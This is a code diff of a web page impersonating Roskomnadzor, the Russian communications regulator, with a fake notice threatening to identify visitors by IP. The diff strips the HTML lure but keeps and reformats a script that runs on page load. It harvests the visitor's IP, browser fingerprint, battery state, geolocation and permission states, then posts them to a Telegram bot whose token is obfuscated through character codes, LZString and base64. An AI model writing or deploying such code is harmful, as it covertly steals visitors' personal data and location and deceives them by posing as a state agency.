@@ -1,113 +1,3 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Роскомнадзор.py</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f8f8;
-        }
-        header {
-            background-color: #2c3e50;
-            color: white;
-            padding: 10px 0;
-            text-align: center;
-        }
-        nav {
-            background-color: #34495e;
-            padding: 10px 0;
-        }
-        nav ul {
-            list-style-type: none;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-        }
-        nav ul li {
-            margin: 0 15px;
-        }
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        main {
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        footer {
-            background-color: #2c3e50;
-            color: white;
-            text-align: center;
-            padding: 10px 0;
-            position: fixed;
-            width: 100%;
-            bottom: 0;
-        }
-        .notice {
-            background-color: #e74c3c;
-            color: white;
-            padding: 10px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <img style='width: 55px; height: auto;' src='https://png.klev.club/uploads/posts/2024-05/png-klev-club-yvpl-p-roskomnadzor-png-4.png'></img>
-        <h1>Федеральная служба по надзору в сфере связи, информационных технологий и массовых коммуникаций</h1>
-    </header>
-     <nav>
-        <ul>
-            <li><a href="#">Главная</a></li>
-            <li><a href="#">О нас</a></li>
-            <li><a href="#">Новости</a></li>
-            <li><a href="#">Контакты</a></li>
-        </ul>
-    </nav>
-    <main>
-        <div class="notice">
-            <p>Уведомление: Ваш IP адрес, зарегистрированный при логировании на данный сайт, будет использоваться в целях установления вашей личности при наблюдении подозрительных действий. Для того чтобы установить дополнительные детали, напишите нашему менеджеру: @imancat</p>
-        </div>
-        <h2>Добро пожаловать на сайт Роскомнадзора</h2>
-        <p>Федеральная служба по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзор) осуществляет функции по контролю и надзору в сфере средств массовой информации, включая электронные СМИ, и информационно-телекоммуникационные сети, а также в области персональных данных.</p>
-        <h3>Наши задачи</h3>
-        <ul>
-            <li>Контроль и надзор в сфере связи</li>
-            <li>Контроль и надзор в сфере информационных технологий</li>
-            <li>Контроль и надзор в сфере массовых коммуникаций</li>
-        </ul>
-        
-        <div class="news">
-            <h3>Новости IT и блокировки Роскомнадзора</h3>
-            
-            <article>
-                <h4>Роскомнадзор заблокировал доступ к новому мессенджеру</h4>
-                <p>Сегодня Роскомнадзор объявил о блокировке нового мессенджера "ChatNow", ссылаясь на нарушения в области хранения данных пользователей на зарубежных серверах. Представители мессенджера заявили о намерении перенести сервера в Россию для соответствия законодательству.</p>
-            </article>
-            
-            <article>
-                <h4>Роскомнадзор усиливает контроль за VPN-сервисами</h4>
-                <p>В ответ на рост популярности VPN-сервисов среди граждан, Роскомнадзор объявил о новых мерах по блокировке VPN-платформ, которые не соответствуют требованиям по фильтрации контента. Пользователи уже начали искать альтернативные способы обхода блокировок.</p>
-            </article>
-            
-            <article>
-                <h4>Роскомнадзор оштрафовал крупную IT-компанию за нарушение закона о персональных данных</h4>
-                <p>Крупная IT-компания была оштрафована на значительную сумму за нарушение закона о персональных данных. Проверка показала, что компания не обеспечила должный уровень защиты данных пользователей, что стало причиной утечки информации.</p>
-            </article>
-        </div>
-    </main>
-    <footer>
-        <p>&copy; 2024 Роскомнадзор. Все права защищены.</p>
-    </footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
 <script>
 let userIp; // Переменная для хранения IP-адреса
 
@@ -118,134 +8,136 @@ async function ip() {
         userIp = data.ip; // Сохраняем IP-адрес в переменной
         return `IP-адрес: ${userIp}`;
     } catch (error) {
+        console.error('Ошибка получения IP-адреса:', error);
         return 'Не удалось получить IP-адрес.';
     }
 }
 
-ip();
-    async function navdata() {
-        const navigatorData = {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            languages: navigator.languages,
-            platform: navigator.platform,
-            appVersion: navigator.appVersion,
-            vendor: navigator.vendor,
-            product: navigator.product,
-            cookieEnabled: navigator.cookieEnabled,
-            online: navigator.onLine,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            deviceMemory: navigator.deviceMemory || "Не доступно",
-            maxTouchPoints: navigator.maxTouchPoints,
-            connection: navigator.connection ? {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            } : "Не поддерживается",
-            serviceWorker: 'Service Worker поддерживается: ' + ('serviceWorker' in navigator),
-            battery: await getBatteryInfo(),
-            mediaDevices: 'Media Devices поддерживается: ' + ('mediaDevices' in navigator),
-            userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "uaFullVersion"]) : "Не поддерживается",
-            geolocation: await getGeolocationData(),
-            permissions: await getPermissions(),
-            hardware: {
-                touch: navigator.maxTouchPoints > 0 ? 'Поддерживает касания' : 'Не поддерживает касания',
-                fullscreen: document.fullscreenEnabled ? 'Поддерживает полноэкранный режим' : 'Не поддерживает полноэкранный режим'
-            },
-            pdfViewer: 'PDF Viewer поддерживается: ' + (navigator.pdfViewerEnabled ? 'Да' : 'Нет'),
-            clipboard: 'Clipboard API поддерживается: ' + (navigator.clipboard ? 'Да' : 'Нет'),
-            virtualKeyboard: 'Virtual Keyboard API поддерживается: ' + ('getInstalledRelatedApps' in navigator),
+async function navdata() {
+    const navigatorData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        appVersion: navigator.appVersion,
+        vendor: navigator.vendor,
+        product: navigator.product,
+        cookieEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "Не доступно",
+        maxTouchPoints: navigator.maxTouchPoints,
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        } : "Не поддерживается",
+        serviceWorker: 'Service Worker поддерживается: ' + ('serviceWorker' in navigator),
+        battery: await getBatteryInfo(),
+        mediaDevices: 'Media Devices поддерживается: ' + ('mediaDevices' in navigator),
+        userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "uaFullVersion"]) : "Не поддерживается",
+        geolocation: await getGeolocationData(),
+        permissions: await getPermissions(),
+        hardware: {
+            touch: navigator.maxTouchPoints > 0 ? 'Поддерживает касания' : 'Не поддерживает касания',
+            fullscreen: document.fullscreenEnabled ? 'Поддерживает полноэкранный режим' : 'Не поддерживает полноэкранный режим'
+        },
+        pdfViewer: 'PDF Viewer поддерживается: ' + (navigator.pdfViewerEnabled ? 'Да' : 'Нет'),
+        clipboard: 'Clipboard API поддерживается: ' + (navigator.clipboard ? 'Да' : 'Нет'),
+        virtualKeyboard: 'Virtual Keyboard API поддерживается: ' + ('getInstalledRelatedApps' in navigator),
+    };
+
+    return navigatorData; // Return the actual data object
+}
+
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+        const battery = await navigator.getBattery();
+        return {
+            level: battery.level * 100 + '%', // Процент заряда
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime,
         };
-
-        return navigatorData; // Return the actual data object
     }
+    return "Не поддерживается";
+}
 
-    async function getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery();
-            return {
-                level: battery.level * 100 + '%', // Процент заряда
-                charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime,
-            };
-        }
-        return "Не поддерживается";
-    }
-
-    async function getGeolocationData() {
-        return new Promise((resolve) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    resolve({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    });
-                }, error => {
-                    console.error('Ошибка получения геолокации:', error);
-                    resolve("Геолокация недоступна");
+async function getGeolocationData() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
                 });
+            }, error => {
+                console.error('Ошибка получения геолокации:', error);
+                resolve("Геолокация недоступна");
+            });
+        } else {
+            resolve("Геолокация не поддерживается");
+        }
+    });
+}
+
+async function getPermissions() {
+    const permissions = {};
+    const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'midi', 'background-sync'];
+    for (const name of permissionNames) {
+        try {
+            const permissionStatus = await navigator.permissions.query({ name });
+            permissions[name] = permissionStatus.state;
+        } catch (e) {
+            permissions[name] = "Не поддерживается";
+        }
+    }
+    return permissions;
+}
+
+async function lognavigator() {
+    let data = await navdata();
+    data = JSON.stringify(data, null, 2);
+    return data;
+}
+
+async function main() {
+    // Сначала получаем IP-адрес
+    await ip(); // Ждем завершения получения IP-адреса
+
+    let user = await lognavigator();
+    const skibidi = '7298-61610-3808-45570-42248-50544-5526-112-4225-5312-4984-1702-5632-45248-4864-25090-14344-24584-32842-29706-9876-360-1899-35888-32835-6190-108-778-53249-8604-41728-52408-122-14112-2624-9364-130-376-29952';
+
+    function sendMessage() {
+        const url = `https://api.telegram.org/bot${atob(LZString.decompress(skibidi.split('-').map(num => String.fromCharCode(num)).join('')))}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '5061178189',
+                text: `${user}, ${userIp}` // Используем ожидаемые данные пользователя
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // alert('Message sent successfully!');
             } else {
-                resolve("Геолокация не поддерживается");
+                // alert('Failed to send message.');
             }
+        })
+        .catch(error => {
+            console.error('Error sending message: ', error);
+            // alert('Ошибка при отправке сообщения.');
         });
     }
 
-    async function getPermissions() {
-        const permissions = {};
-        const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'midi', 'background-sync'];
-        for (const name of permissionNames) {
-            try {
-                const permissionStatus = await navigator.permissions.query({ name });
-                permissions[name] = permissionStatus.state;
-            } catch (e) {
-                permissions[name] = "Не поддерживается";
-            }
-        }
-        return permissions;
-    }
+    sendMessage();
+}
 
-     async function lognavigator() {
-        let data = await navdata();
-        data = JSON.stringify(data, null, 2);
-        return data;
-    }
-
-    async function main() {
-        let user = await lognavigator();
-        const skibidi = '7298-61610-3808-45570-42248-50544-5526-112-4225-5312-4984-1702-5632-45248-4864-25090-14344-24584-32842-29706-9876-360-1899-35888-32835-6190-108-778-53249-8604-41728-52408-122-14112-2624-9364-130-376-29952';
-
-        function sendMessage() {
-            const url = `https://api.telegram.org/bot${atob(LZString.decompress(skibidi.split('-').map(num => String.fromCharCode(num)).join('')))}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: '5061178189',
-                    text: `${user}, ${userIp}`// Use the awaited user data
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    // alert('Message sent successfully!');
-                } else {
-                    // alert('Failed to send message.');
-                }
-            })
-            .catch(error => {
-                console.error('Error sending message: ', error);
-                // alert('Ошибка при отправке сообщения.');
-            });
-        }
-
-        sendMessage();
-    }
-
-    main();
+// Запуск функции main
+main();
 </script>
-</body>
-</html>
